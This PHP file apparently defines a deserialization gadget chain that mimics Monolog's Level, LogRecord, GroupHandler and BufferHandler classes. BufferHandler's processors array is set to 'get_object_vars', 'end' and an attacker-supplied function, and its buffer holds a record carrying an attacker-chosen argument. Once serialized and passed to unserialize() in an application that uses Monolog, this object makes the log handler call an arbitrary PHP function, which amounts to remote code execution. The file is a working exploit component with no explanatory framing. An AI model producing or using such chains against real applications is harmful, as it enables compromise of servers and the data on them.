<?php

namespace Monolog
{
    enum Level: int
    {
        case Debug = 100;
    }

    class LogRecord
    {
        public Level $level;
        public mixed $formatted;
        
        function __construct($parameter)
        {
            $this->level = \Monolog\Level::Debug;
            $this->mixed = $parameter;
        }
    }
}

namespace Monolog\Handler
{
    class GroupHandler
    {
        protected array $handlers;
        
        public function __construct($function, $parameter) 
        {
            $this->handlers = [new \Monolog\Handler\BufferHandler($function, $parameter)];
        }
    }
    
    class BufferHandler 
    {
        protected $handler;
        protected int $bufferSize = 1;
        protected int $bufferLimit = 0;
        protected array $buffer;
        protected bool $initialized = true;
        protected array $processors;
        
        public function __construct($function, $parameter) 
        {
            $this->handler = $this;
            $this->buffer = [new \Monolog\LogRecord($parameter)];
            $this->processors = ['get_object_vars', 'end', $function];
        }
    }
}